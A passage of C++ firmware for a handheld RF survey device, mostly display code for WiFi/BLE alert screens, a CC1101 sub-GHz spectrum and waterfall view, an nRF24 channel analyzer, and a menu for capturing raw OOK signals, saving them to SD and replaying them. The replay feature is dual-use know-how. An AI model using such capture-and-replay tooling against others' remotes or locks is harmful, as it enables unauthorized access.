        M5.Display.setTextColor(kText, kPanelAlt);
      }
      const char src = g_alertItems[i].source == AlertSource::Wifi ? 'W' : 'B';
      M5.Display.setCursor(14, y);
      M5.Display.printf("%d %c %-12s %2d %s", i + 1, src, label.c_str(),
                        g_alertItems[i].riskScore, g_alertItems[i].reason.c_str());
    }
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent:info ;/.:move Fn+R:refresh");
}

void drawAlertsDetailScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const AlertItem& alert = g_alertItems[g_alertSelected];

  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Alert Detail");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);
  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.println("Src");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 36);
  M5.Display.println(alert.source == AlertSource::Wifi ? "WiFi" : "BLE");

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 50);
  M5.Display.println("Risk");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 50);
  M5.Display.printf("%d", alert.riskScore);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 64);
  M5.Display.println("Why");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 64);
  M5.Display.println(alert.reason);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 78);
  M5.Display.println("Name");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 78);
  M5.Display.println(alert.label);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 92);
  M5.Display.println("Info");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 92);
  if (alert.source == AlertSource::Wifi) {
    const WifiScanItem& item = g_wifiItems[alert.sourceIndex];
    M5.Display.printf("ch%d %s", item.channel, authLabel(item.auth));
  } else {
    const BleScanItem& item = g_bleItems[alert.sourceIndex];
    M5.Display.printf("%s %s", item.vendorHint.c_str(), item.roleHint.c_str());
  }

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 106);
  M5.Display.println("Seen");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 106);
  if (alert.source == AlertSource::Wifi) {
    const WifiScanItem& item = g_wifiItems[alert.sourceIndex];
    M5.Display.printf("%lu/%lu", static_cast<unsigned long>(item.firstSeenScan),
                      static_cast<unsigned long>(item.lastSeenScan));
  } else {
    const BleScanItem& item = g_bleItems[alert.sourceIndex];
    M5.Display.printf("%lu/%lu", static_cast<unsigned long>(item.firstSeenScan),
                      static_cast<unsigned long>(item.lastSeenScan));
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent list  Fn+Bk back  Tab+Bk");
}

void drawAlertsScreen(TeamMode mode) {
  buildAlertFeed();
  if (g_alertDetail && g_alertCount > 0) {
    drawAlertsDetailScreen(mode);
  } else {
    drawAlertsListScreen(mode);
  }
}

void refreshCc1101Console() {
  ++g_cc1101RefreshCount;
  g_cc1101Probe = hardwarePollCc1101(atoi(g_cc1101Bands[g_cc1101BandIndex]), g_cc1101Sensitivity);
  g_cc1101LastGdo0 = g_cc1101Probe.gdo0;
  g_cc1101RiskScore = g_cc1101Probe.present ? (20 + (g_cc1101Sensitivity * 8) +
                                               (g_cc1101Probe.rxBytes > 0 ? 18 : 0) +
                                               (g_cc1101Probe.rssiDbm > -80 ? 10 : 0))
                                            : 0;
  g_cc1101SurveyHotIndex = 0;
  for (int i = 0; i < 4; ++i) {
    g_cc1101Survey[i] = hardwarePollCc1101(atoi(g_cc1101Bands[i]), g_cc1101Sensitivity);
    g_cc1101SurveyScore[i] = g_cc1101Survey[i].present
                                 ? (g_cc1101Survey[i].rxBytes * 3) +
                                       (g_cc1101Survey[i].gdo0 ? 15 : 0) +
                                       (g_cc1101Survey[i].rssiDbm > -95 ? (100 + g_cc1101Survey[i].rssiDbm) : 0)
                                 : 0;
    if (g_cc1101SurveyScore[i] > g_cc1101SurveyScore[g_cc1101SurveyHotIndex]) {
      g_cc1101SurveyHotIndex = i;
    }
  }
  g_cc1101BurstScore = g_cc1101Survey[g_cc1101SurveyHotIndex].rxBytes + (g_cc1101Survey[g_cc1101SurveyHotIndex].gdo0 ? 4 : 0);
  g_cc1101PatternScore = 0;
  for (int i = 0; i < 4; ++i) {
    if (g_cc1101Survey[i].rxBytes >= 2) ++g_cc1101PatternScore;
    if (g_cc1101Survey[i].gdo0) g_cc1101PatternScore += 2;
  }
  if (g_cc1101SurveyScore[g_cc1101SurveyHotIndex] >= g_cc1101EvidenceScore) {
    g_cc1101EvidenceBand = g_cc1101SurveyHotIndex;
    g_cc1101EvidenceRssi = g_cc1101Survey[g_cc1101SurveyHotIndex].rssiDbm;
    g_cc1101EvidenceBytes = g_cc1101Survey[g_cc1101SurveyHotIndex].rxBytes;
    g_cc1101EvidenceScore = g_cc1101SurveyScore[g_cc1101SurveyHotIndex];
    g_cc1101EvidenceTick = g_cc1101RefreshCount;
  }
  for (int i = 0; i < 4; ++i) {
    int spec = g_cc1101SurveyScore[i] / 4;
    if (spec < 0) spec = 0;
    if (spec > 15) spec = 15;
    g_cc1101Spectrum[i] = static_cast<uint8_t>(spec);
    g_cc1101Waterfall[g_cc1101WaterfallHead][i] = g_cc1101Spectrum[i];
  }
  g_cc1101WaterfallHead = (g_cc1101WaterfallHead + 1) % kRfWaterfallCols;

  switch (g_cc1101BandIndex) {
    case 0: g_cc1101SweepStart = 314.0f; g_cc1101SweepEnd = 316.0f; break;
    case 1: g_cc1101SweepStart = 432.0f; g_cc1101SweepEnd = 435.0f; break;
    case 2: g_cc1101SweepStart = 867.0f; g_cc1101SweepEnd = 870.0f; break;
    case 3: g_cc1101SweepStart = 914.0f; g_cc1101SweepEnd = 917.0f; break;
  }
  for (int i = 0; i < kRfDisplayBins; ++i) {
    const float f = g_cc1101SweepStart + ((g_cc1101SweepEnd - g_cc1101SweepStart) * i) / (kRfDisplayBins - 1);
    const int rssi = hardwareCc1101ReadRssiAtFreq(f, g_cc1101Sensitivity);
    g_cc1101SweepRssi[i] = rssi;
    int level = map(rssi, -100, -35, 0, 100);
    if (level < 0) level = 0;
    if (level > 100) level = 100;
    g_cc1101SweepLevel[i] = static_cast<uint8_t>(level);
    g_cc1101Waterfall[g_cc1101WaterfallHead][i] = g_cc1101SweepLevel[i];
    if (level >= g_cc1101SweepPeak[i]) {
      g_cc1101SweepPeak[i] = level;
      g_cc1101SweepPeakTimer[i] = 18;
    } else if (g_cc1101SweepPeakTimer[i] > 0) {
      --g_cc1101SweepPeakTimer[i];
    } else if (g_cc1101SweepPeak[i] > 0) {
      --g_cc1101SweepPeak[i];
    }
  }
}

// Returns a heat-map colour for 0-100 signal level (radio heat palette).
static uint16_t rfHeatColor(uint8_t level, uint16_t accent, uint16_t soft) {
  if (level > 88) return 0xF800;        // red
  if (level > 72) return 0xFA40;        // red-orange
  if (level > 56) return 0xFD20;        // orange
  if (level > 40) return 0xFFE0;        // yellow
  if (level > 24) return accent;        // theme accent (bright for active)
  if (level > 10) return soft;          // dim accent
  return 0x0000;                        // black / empty
}

static const char* kBlueCc1101MenuItems[] = {
  "Spectrum",
  "Waterfall",
  "Capture",
  "SD Replay",
};

static void drawBlueCc1101MenuScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  const uint16_t bg     = themeModeBg(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(bg);
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.print("CC1101");
  M5.Display.setTextColor(accent, panel);
  M5.Display.print(" INTEL");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(160, 8);
  M5.Display.printf("%.2fMHz", g_cc1101SweepStart);

  const bool hasHw = hardwareCurrentProfile() == HardwareProfile::RfHat;
  for (int i = 0; i < 4; ++i) {
    const int y = 26 + i * 14;
    const bool sel = (i == g_blueCc1101MenuSel);
    M5.Display.fillRect(8, y, 224, 13, sel ? kPanelAlt : bg);
    M5.Display.setTextColor(sel ? accent : kText, sel ? kPanelAlt : bg);
    M5.Display.setCursor(14, y + 2);
    M5.Display.print(sel ? "> " : "  ");
    M5.Display.print(kBlueCc1101MenuItems[i]);
    if (i == 2 && g_blueHasCapture)
      M5.Display.printf(" (%dp)", g_blueRawCapture.count);
    if (i == 3)
      M5.Display.printf(" (%d files)", g_cc1101SdFileCount);
  }

  M5.Display.fillRect(8, 82, 224, 10, kPanelAlt);
  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(12, 84);
  M5.Display.printf("%s  Band:%sMHz", hasHw ? "RF HAT OK" : "NO RF HAT", g_cc1101Bands[g_cc1101BandIndex]);

  M5.Display.fillRect(8, 95, 224, 34, bg);
  M5.Display.drawFastHLine(8, 95, 224, accent);
  M5.Display.setTextColor(kDimText, bg);
  M5.Display.setCursor(12, 104);
  M5.Display.print("Ent sel ;/. move Fn+Bk");
}

static void drawBlueCc1101SdReplayScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  const uint16_t bg     = themeModeBg(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(bg);
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.print("CC1101");
  M5.Display.setTextColor(accent, panel);
  M5.Display.print(" SD Replay");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 6, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 6, accent);
  M5.Display.drawFastHLine(14, 38, 212, kGold);

  if (g_cc1101SdFileCount == 0) {
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 44);
    M5.Display.println("No captures on SD.");
    M5.Display.setCursor(14, 56);
    M5.Display.println("Go to Capture view,");
    M5.Display.setCursor(14, 68);
    M5.Display.println("capture a signal,");
    M5.Display.setCursor(14, 80);
    M5.Display.println("then press Fn+D to save.");
  } else {
    M5.Display.setTextColor(accent, kPanelAlt);
    M5.Display.setCursor(14, 30);
    M5.Display.printf("SD Files (%d):", g_cc1101SdFileCount);
    const int maxShow = min(g_cc1101SdFileCount, 6);
    for (int i = 0; i < maxShow; ++i) {
      const int y = 42 + i * 12;
      const bool sel = (i == g_cc1101SdFileSel);
      if (sel) {
        M5.Display.fillRoundRect(12, y - 1, 216, 11, 2, accent);
        M5.Display.setTextColor(WHITE, accent);
      } else {
        M5.Display.setTextColor(kText, kPanelAlt);
      }
      M5.Display.setCursor(16, y + 1);
      M5.Display.printf("%.34s", g_cc1101SdFiles[i]);
    }
  }

  if (g_cc1101SdMsg[0]) {
    M5.Display.fillRect(8, 124, 224, 10, bg);
    M5.Display.setTextColor(kGold, bg);
    M5.Display.setCursor(12, 126);
    M5.Display.printf("%.36s", g_cc1101SdMsg);
  } else {
    M5.Display.fillRect(8, 124, 224, 10, bg);
    M5.Display.setTextColor(kDimText, bg);
    M5.Display.setCursor(12, 126);
    M5.Display.print("Ent play ;/. pick Fn+D del");
  }
}

void drawCc1101ScanScreen(TeamMode mode) {
  if (g_blueCc1101View == BlueCc1101View::Menu) {
    drawBlueCc1101MenuScreen(mode);
    return;
  }
  if (g_blueCc1101View == BlueCc1101View::SdReplay) {
    drawBlueCc1101SdReplayScreen(mode);
    return;
  }
  if (g_blueCc1101View == BlueCc1101View::Renaming) {
    drawBlueCc1101SdReplayScreen(mode);
    drawRenameOverlay(mode);
    return;
  }
  if (g_cc1101RefreshCount == 0) refreshCc1101Console();
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  const uint16_t soft   = themeModeSoft(mode);
  const uint16_t bg     = themeModeBg(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(bg);

  // ── Header ────────────────────────────────────────────────────────────────
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.print("CC1101");
  M5.Display.setTextColor(accent, panel);
  M5.Display.print(" INTEL");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(152, 8);
  M5.Display.printf("%.2f-%.2fMHz", g_cc1101SweepStart, g_cc1101SweepEnd);

  if (hardwareCurrentProfile() != HardwareProfile::RfHat) {
    M5.Display.fillRoundRect(8, 28, 224, 92, 8, kPanelAlt);
    M5.Display.drawRoundRect(8, 28, 224, 92, 8, accent);
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 40);
    M5.Display.println("RF hat required");
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 56);
    M5.Display.println("Press H in launcher");
    M5.Display.setCursor(14, 68);
    M5.Display.println("then choose RF mode");
    M5.Display.setCursor(14, 84);
    M5.Display.println("CC1101 CS=G13  GDO0=G5");
  } else if (g_blueCc1101View == BlueCc1101View::Spectrum) {
    // ── Compact stats strip ────────────────────────────────────────────────
    M5.Display.fillRect(0, 23, kScreenW, 28, kPanelAlt);
    M5.Display.drawFastHLine(0, 51, kScreenW, accent);
    M5.Display.setTextColor(accent, kPanelAlt);
    M5.Display.setCursor(6, 26);
    M5.Display.printf("Band:%sMHz", g_cc1101Bands[g_cc1101BandIndex]);
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(90, 26);
    M5.Display.printf("RSSI:%ddBm", g_cc1101Survey[g_cc1101SurveyHotIndex].rssiDbm);
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(172, 26);
    M5.Display.printf("S:%d", g_cc1101Sensitivity);

    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(6, 38);
    M5.Display.printf("Hot:%s  Burst:%d  Risk:%d",
      g_cc1101Bands[g_cc1101SurveyHotIndex], g_cc1101BurstScore, g_cc1101RiskScore);

    // ── Spectrum graph ─────────────────────────────────────────────────────
    const int gLeft  = 6;
    const int gRight = 234;
    const int gWidth = gRight - gLeft;
    const int baseY  = 120;
    const int graphH = 64;
    const int gTop   = baseY - graphH;

    // Background fill + border
    M5.Display.fillRect(gLeft, gTop, gWidth, graphH + 1, 0x0841);
    M5.Display.drawRect(gLeft - 1, gTop - 1, gWidth + 2, graphH + 2, soft);

    // Grid lines (horizontal dB guides)
    for (int pct : {25, 50, 75}) {
      const int gy = baseY - (pct * graphH) / 100;
      M5.Display.drawFastHLine(gLeft, gy, gWidth, 0x2104);
    }
    // Vertical frequency guides
    for (int gi = 1; gi <= 3; ++gi) {
      const int gx = gLeft + (gi * gWidth) / 4;
      M5.Display.drawFastVLine(gx, gTop, graphH, 0x2104);
    }

    // Bars + peaks
    for (int i = 0; i < kRfDisplayBins; ++i) {
      const int x     = gLeft + (i * gWidth) / kRfDisplayBins;
      const int nextX = gLeft + ((i + 1) * gWidth) / kRfDisplayBins;
      const int w     = max(1, nextX - x);
      const int h     = (g_cc1101SweepLevel[i] * graphH) / 100;
      if (h > 0)
        M5.Display.fillRect(x, baseY - h, w, h, rfHeatColor(g_cc1101SweepLevel[i], accent, soft));
      if (g_cc1101SweepPeak[i] > 1) {
        const int py = baseY - (g_cc1101SweepPeak[i] * graphH) / 100;
        M5.Display.drawFastHLine(x, py, w, kGold);
      }
    }

    // Baseline + freq labels
    M5.Display.drawFastHLine(gLeft, baseY, gWidth, accent);
    M5.Display.setTextColor(kDimText, bg);
    M5.Display.setCursor(gLeft, 122);
    M5.Display.printf("%.0f", g_cc1101SweepStart);
    M5.Display.setCursor(100, 122);
    M5.Display.printf("%.0fMHz", (g_cc1101SweepStart + g_cc1101SweepEnd) / 2.0f);
    M5.Display.setCursor(196, 122);
    M5.Display.printf("%.0f", g_cc1101SweepEnd);
  } else if (g_blueCc1101View == BlueCc1101View::Waterfall) {
    // ── Waterfall ─────────────────────────────────────────────────────────
    const int gLeft  = 0;
    const int gWidth = kScreenW;
    const int wfTop  = 23;
    const int wfH    = 100;

    for (int row = 0; row < kRfWaterfallCols; ++row) {
      const int srcRow = (g_cc1101WaterfallHead + row) % kRfWaterfallCols;
      const int rowH   = wfH / kRfWaterfallCols;
      const int y      = wfTop + row * rowH;
      for (int i = 0; i < kRfDisplayBins; ++i) {
        const int x     = gLeft + (i * gWidth) / kRfDisplayBins;
        const int nextX = gLeft + ((i + 1) * gWidth) / kRfDisplayBins;
        const int w     = max(1, nextX - x);
        const uint8_t level = g_cc1101Waterfall[srcRow][i];
        M5.Display.fillRect(x, y, w, max(1, rowH - 1), rfHeatColor(level, accent, soft));
      }
    }

    // Overlay band label at top of waterfall
    M5.Display.fillRect(0, 23, kScreenW, 11, 0x0000U);
    M5.Display.setTextColor(kGold, 0x0000U);
    M5.Display.setCursor(4, 24);
    M5.Display.printf("Waterfall  %s MHz  [%ddBm]",
      g_cc1101Bands[g_cc1101BandIndex],
      g_cc1101Survey[g_cc1101SurveyHotIndex].rssiDbm);

    // Freq scale below waterfall
    const int scaleY = wfTop + wfH + 1;
    M5.Display.drawFastHLine(0, scaleY, kScreenW, accent);
    M5.Display.setTextColor(kDimText, bg);
    M5.Display.setCursor(2, scaleY + 2);
    M5.Display.printf("%.0f", g_cc1101SweepStart);
    M5.Display.setCursor(98, scaleY + 2);
    M5.Display.printf("%.0fMHz", (g_cc1101SweepStart + g_cc1101SweepEnd) / 2.0f);
    M5.Display.setCursor(196, scaleY + 2);
    M5.Display.printf("%.0f", g_cc1101SweepEnd);
  } else if (g_blueCc1101View == BlueCc1101View::Capture) {
    // ── Capture / Replay view ─────────────────────────────────────────────
    M5.Display.fillRect(0, 23, kScreenW, 100, kPanelAlt);
    M5.Display.drawRect(0, 23, kScreenW, 100, accent);

    // Title row
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(6, 26);
    M5.Display.print("CAPTURE / REPLAY");
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(140, 26);
    M5.Display.printf("Band:%sMHz  S:%d", g_cc1101Bands[g_cc1101BandIndex], g_cc1101Sensitivity);

    // Live RSSI / GDO0 bar
    const int rssiPct = max(0, min(100, g_cc1101Survey[g_cc1101SurveyHotIndex].rssiDbm + 120));
    const int barW = (rssiPct * 220) / 100;
    M5.Display.fillRect(6, 38, barW, 5, rfHeatColor(rssiPct, accent, soft));
    M5.Display.fillRect(6 + barW, 38, 220 - barW, 5, 0x1082);

    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(6, 48);
    M5.Display.printf("RSSI: %ddBm  GDO0:%d  Scans:%d",
      g_cc1101Survey[g_cc1101SurveyHotIndex].rssiDbm,
      g_cc1101LastGdo0, g_blueCaptureCount);

    if (g_blueHasCapture) {
      M5.Display.setTextColor(kGold, kPanelAlt);
      M5.Display.setCursor(6, 62);
      M5.Display.printf("[CAPTURED] %d pulses  RSSI:%ddBm",
        g_blueRawCapture.count, g_blueRawCapture.rssiDbm);

      // Compute total duration in ms
      uint32_t durationUs = 0;
      for (int i = 0; i < g_blueRawCapture.count; ++i) durationUs += g_blueRawCapture.pulses[i];
      M5.Display.setTextColor(accent, kPanelAlt);
      M5.Display.setCursor(6, 74);
      M5.Display.printf("Freq:%dMHz  Dur:%.2fs  RAW OOK",
        g_blueRawCapture.freqMHz, durationUs / 1000000.0f);

      M5.Display.setTextColor(kDimText, kPanelAlt);
      M5.Display.setCursor(6, 86);
      M5.Display.printf("Replayed:%d  SD:%d files", g_blueCaptureReplays, g_cc1101SdFileCount);

      if (g_cc1101SdMsg[0]) {
        M5.Display.setTextColor(kGold, kPanelAlt);
        M5.Display.setCursor(6, 98);
        M5.Display.printf("%.36s", g_cc1101SdMsg);
      }
    } else {
      M5.Display.setTextColor(kGold, kPanelAlt);
      M5.Display.setCursor(6, 62);
      M5.Display.println(">> Listening for RAW signal...");
      M5.Display.setTextColor(kDimText, kPanelAlt);
      M5.Display.setCursor(6, 74);
      M5.Display.printf("Attempts: %d  Band: %sMHz", g_blueCaptureCount, g_cc1101Bands[g_cc1101BandIndex]);
      M5.Display.setCursor(6, 86);
      M5.Display.printf("SD saved: %d files", g_cc1101SdFileCount);
      if (g_cc1101SdMsg[0]) {
        M5.Display.setTextColor(kText, kPanelAlt);
        M5.Display.setCursor(6, 98);
        M5.Display.printf("%.36s", g_cc1101SdMsg);
      }
    }
  }

  M5.Display.setTextColor(kDimText, bg);
  M5.Display.setCursor(4, 127);
  if (g_blueCc1101View == BlueCc1101View::Capture) {
    if (g_blueHasCapture)
      M5.Display.print("Ent TX Fn+D save Fn+R clr");
    else
      M5.Display.print("auto OOK  Fn+Bk menu");
  } else {
    M5.Display.print(";/ band Fn+S sens Fn+R poll");
  }
}

void refreshNrfConsole() {
  ++g_nrfRefreshCount;
  g_nrfProbe = hardwarePollNrf24(g_nrfChannels[g_nrfChannelIndex], g_nrfDensity);
  g_nrfLastCe = g_nrfProbe.ce;
  g_nrfRiskScore = g_nrfProbe.present ? (22 + (g_nrfDensity * 7) +
                                         (g_nrfProbe.rpdHits * 8))
                                      : 0;
  hardwareNrf24FullSweepScan(g_nrfSweep);
  g_nrfHotChannel = 0;
  g_nrfHotValue = g_nrfSweep[0];
  for (int ch = 1; ch < 126; ++ch) {
    if (g_nrfSweep[ch] > g_nrfHotValue) {
      g_nrfHotValue = g_nrfSweep[ch];
      g_nrfHotChannel = ch;
    }
  }
  g_nrfBurstScore = (g_nrfProbe.rpdHits * 3) + g_nrfHotValue;
  if (g_nrfHotValue >= g_nrfEvidenceValue) {
    g_nrfEvidenceChannel = g_nrfHotChannel;
    g_nrfEvidenceValue = g_nrfHotValue;
    g_nrfEvidenceRpdHits = g_nrfProbe.rpdHits;
    g_nrfEvidenceTick = g_nrfRefreshCount;
  }
  for (int i = 0; i < 7; ++i) {
    int spec = g_nrfSweep[g_nrfChannels[i]];
    if (spec > 15) spec = 15;
    g_nrfSpectrum[i] = static_cast<uint8_t>(spec);
    g_nrfWaterfall[g_nrfWaterfallHead][i] = g_nrfSpectrum[i];
  }
  g_nrfWaterfallHead = (g_nrfWaterfallHead + 1) % kRfWaterfallCols;
  for (int ch = 0; ch < 126; ++ch) {
    const uint8_t level = static_cast<uint8_t>(g_nrfSweep[ch] * 33);
    if (level >= g_nrfPeak[ch]) {
      g_nrfPeak[ch] = level;
      g_nrfPeakTimer[ch] = 18;
    } else if (g_nrfPeakTimer[ch] > 0) {
      --g_nrfPeakTimer[ch];
    } else if (g_nrfPeak[ch] > 0) {
      --g_nrfPeak[ch];
    }
  }
  for (int i = 0; i < kRfDisplayBins; ++i) {
    const int startCh = (i * 126) / kRfDisplayBins;
    const int endCh = ((i + 1) * 126) / kRfDisplayBins;
    uint8_t binLevel = 0;
    for (int ch = startCh; ch < endCh; ++ch) {
      const uint8_t level = static_cast<uint8_t>(g_nrfSweep[ch] * 33);
      if (level > binLevel) binLevel = level;
    }
    g_nrfDisplayLevel[i] = binLevel;
    g_nrfWaterfall[g_nrfWaterfallHead][i] = binLevel;
  }
}

void drawNrfAnalyzerScreen(TeamMode mode) {
  if (g_nrfRefreshCount == 0) refreshNrfConsole();
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel  = themeModePanel(mode);
  const uint16_t soft   = themeModeSoft(mode);
  const uint16_t bg     = themeModeBg(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(bg);

  // ── Header ────────────────────────────────────────────────────────────────
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.print("nRF24");
  M5.Display.setTextColor(accent, panel);
  M5.Display.print(" INTEL");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(148, 8);
  M5.Display.printf("2.400-2.525 GHz");

  if (hardwareCurrentProfile() != HardwareProfile::RfHat) {
    M5.Display.fillRoundRect(8, 28, 224, 92, 8, kPanelAlt);
    M5.Display.drawRoundRect(8, 28, 224, 92, 8, accent);
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 40);
    M5.Display.println("RF hat required");
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 56);
    M5.Display.println("Press H in launcher");
    M5.Display.setCursor(14, 68);
    M5.Display.println("then choose RF mode");
    M5.Display.setCursor(14, 84);
    M5.Display.println("nRF24 CSN=G6  CE=G4");
  } else if (g_blueNrfView == BlueNrfView::Spectrum) {
    // ── Compact stats strip ────────────────────────────────────────────────
    M5.Display.fillRect(0, 23, kScreenW, 28, kPanelAlt);
    M5.Display.drawFastHLine(0, 51, kScreenW, accent);
    M5.Display.setTextColor(accent, kPanelAlt);
    M5.Display.setCursor(6, 26);
    M5.Display.printf("CH:%03d", g_nrfChannels[g_nrfChannelIndex]);
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(56, 26);
    M5.Display.printf("Hot:%03d  RPD:%d", g_nrfHotChannel, g_nrfProbe.rpdHits);
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(172, 26);
    M5.Display.printf("D:%d", g_nrfDensity);

    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(6, 38);
    M5.Display.printf("Burst:%d  Risk:%d  RF:%02X  FIFO:%02X",
      g_nrfBurstScore, g_nrfRiskScore, g_nrfProbe.rfSetup, g_nrfProbe.fifoStatus);

    // ── Spectrum graph — full 126 channels ────────────────────────────────
    const int gLeft  = 6;
    const int gRight = 234;
    const int gWidth = gRight - gLeft;
    const int baseY  = 120;
    const int graphH = 64;
    const int gTop   = baseY - graphH;

    M5.Display.fillRect(gLeft, gTop, gWidth, graphH + 1, 0x0841);
    M5.Display.drawRect(gLeft - 1, gTop - 1, gWidth + 2, graphH + 2, soft);

    // Horizontal dB guide lines
    for (int pct : {25, 50, 75}) {
      const int gy = baseY - (pct * graphH) / 100;
      M5.Display.drawFastHLine(gLeft, gy, gWidth, 0x2104);
    }
    // Vertical channel guides (every ~25 channels)
    for (int gi = 1; gi <= 4; ++gi) {
      const int gx = gLeft + (gi * gWidth) / 5;
      M5.Display.drawFastVLine(gx, gTop, graphH, 0x2104);
    }

    // One bar per channel (126 channels → each ~1-2px wide)
    for (int i = 0; i < 126; ++i) {
      const int x     = gLeft + (i * gWidth) / 126;
      const int nextX = gLeft + ((i + 1) * gWidth) / 126;
      const int w     = max(1, nextX - x);
      const uint8_t level = static_cast<uint8_t>(g_nrfSweep[i] * 33);
      const int h     = (level * graphH) / 100;
      if (h > 0)
        M5.Display.fillRect(x, baseY - h, w, h, rfHeatColor(level, accent, soft));
      if (g_nrfPeak[i] > 1) {
        const int py = baseY - (g_nrfPeak[i] * graphH) / 100;
        M5.Display.drawFastHLine(x, py, w, kGold);
      }
    }

    // Mark the hot channel with a white tick
    if (g_nrfHotValue > 0) {
      const int hx = gLeft + (g_nrfHotChannel * gWidth) / 126;
      M5.Display.drawFastVLine(hx, baseY - graphH, graphH, 0xFFFF);
    }

    M5.Display.drawFastHLine(gLeft, baseY, gWidth, accent);
    M5.Display.setTextColor(kDimText, bg);
    M5.Display.setCursor(gLeft, 122);
    M5.Display.print("2400");
    M5.Display.setCursor(100, 122);
    M5.Display.print("2462MHz");
    M5.Display.setCursor(200, 122);
    M5.Display.print("2525");
  } else {
    // ── Waterfall — full width, all 126 channels ───────────────────────────
    const int gLeft  = 0;
    const int gWidth = kScreenW;
    const int wfTop  = 23;
    const int wfH    = 100;

    for (int row = 0; row < kRfWaterfallCols; ++row) {
      const int srcRow = (g_nrfWaterfallHead + row) % kRfWaterfallCols;
      const int rowH   = wfH / kRfWaterfallCols;
      const int y      = wfTop + row * rowH;
      for (int i = 0; i < kRfDisplayBins; ++i) {
        const int x     = gLeft + (i * gWidth) / kRfDisplayBins;
        const int nextX = gLeft + ((i + 1) * gWidth) / kRfDisplayBins;
        const int w     = max(1, nextX - x);
        const uint8_t level = g_nrfWaterfall[srcRow][i];
        M5.Display.fillRect(x, y, w, max(1, rowH - 1), rfHeatColor(level, accent, soft));
      }
    }

    // Label overlay
    M5.Display.fillRect(0, 23, kScreenW, 11, 0x0000U);
    M5.Display.setTextColor(kGold, 0x0000U);
    M5.Display.setCursor(4, 24);
    M5.Display.printf("Waterfall  CH:%03d  Hot:%03d  RPD:%d",
